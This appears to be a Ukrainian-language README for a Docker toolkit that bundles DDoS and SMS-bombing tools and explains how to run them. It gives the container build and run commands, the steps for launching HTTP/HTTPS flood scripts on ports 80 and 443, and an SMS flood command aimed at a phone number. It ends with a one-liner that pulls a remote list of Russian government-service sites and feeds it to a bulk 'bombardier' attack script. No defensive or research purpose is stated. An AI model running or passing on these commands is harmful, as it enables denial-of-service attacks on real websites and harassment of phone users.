# Вступ

`toolbox` включає:

* https://github.com/Ranginang67/DarkFly-Tool
* https://github.com/HardyTomas/DDos-Attack-OVH-.git
* https://github.com/LimerBoy/Impulse.git

# Користування

(Не обов'язково) будуємо контейнер:

```shell
docker build -t droopy4096/uait-tools -f containers/Dockerfile.toolkit .
```

Заходимо до контейнера:

```shell
docker run --rm -it droopy4096/uait-tools
root@bda7c51682fb:/opt# 
```

тепер використовуємо:

## DarkFly

https://telegra.ph/DDOS-sajta--DarkFly-08-11

консоль DarkFly:

```shell
DarkFly
```

слідуємо `1` потім `16` встановлюємо `hammer` в `/root/hammer.py` далі по вказівках 

## DDos-Attack-OVH-

https://github.com/HardyTomas/DDos-Attack-OVH-

```shell
cd DDos-Attack-OVH-
python3 80port.py
# or
python3 443port.py
```

##  LimerBoy / Impulse 

https://github.com/LimerBoy/Impulse

```shell
cd LimerBoy-Impulse
python3 impulse.py --method SMS --time 20 --threads 15 --target +380123456789
```

# Automated bombardier

декілька `bombardier` за раз:

```shell
tools/bombarder.sh $(curl -s https://raw.githubusercontent.com/UA-IT-Army/aggressor-sites/main/ru/ru_gosuslugi.json | jq -r '. | keys[]')
```